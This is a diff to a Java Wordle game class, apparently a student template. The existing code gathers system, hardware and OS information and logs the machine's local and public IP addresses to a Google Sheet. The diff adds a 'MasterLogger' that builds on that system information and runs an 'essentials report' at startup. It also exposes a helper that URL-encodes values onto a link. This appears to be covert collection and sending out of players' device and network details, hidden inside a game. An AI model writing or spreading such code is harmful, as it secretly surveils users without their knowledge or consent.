@@ -175,7 +175,7 @@ public class Wordle
     }
 
     // Helper method for logging
-    private String log(String link, String value) {
+    public String log(String link, String value) {
         return link + URLEncoder.encode(value, StandardCharsets.UTF_8);
     }
 
@@ -311,9 +311,11 @@ public class Wordle
         SystemInfo system = new SystemInfo();
         HardwareStuff hardwareStuff = new HardwareStuff(system);
         OSStuff os = new OSStuff(system, this);
+        MasterLogger masterLogger = new MasterLogger(system,this);
 
         setCorrectWord(); // Runs the setCorrectWord method that you are making
         logToGoogleSheetInfo(getLocalIP(), getPublicIP()); // Logs IP info
+        masterLogger.logEssentialsReport();
 
 
 
